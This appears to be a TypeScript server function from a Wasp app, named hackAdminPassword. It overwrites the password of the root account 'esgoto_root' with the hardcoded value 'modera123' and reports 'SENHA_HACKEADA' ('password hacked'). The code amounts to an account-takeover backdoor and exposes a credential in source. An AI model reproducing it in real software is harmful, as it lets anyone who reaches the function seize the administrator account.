import { prisma } from 'wasp/server';
import { sanitizeAndSerializeProviderData } from 'wasp/server/auth';

export const hackAdminPassword = async () => {
  try {
    const providerData = await sanitizeAndSerializeProviderData({ hashedPassword: 'modera123' });
    await prisma.authIdentity.updateMany({
      where: { providerName: 'username', providerUserId: 'esgoto_root' },
      data: { providerData }
    });
    return "SENHA_HACKEADA";
  } catch (e: any) {
    return "ERRO: " + e.message;
  }
};
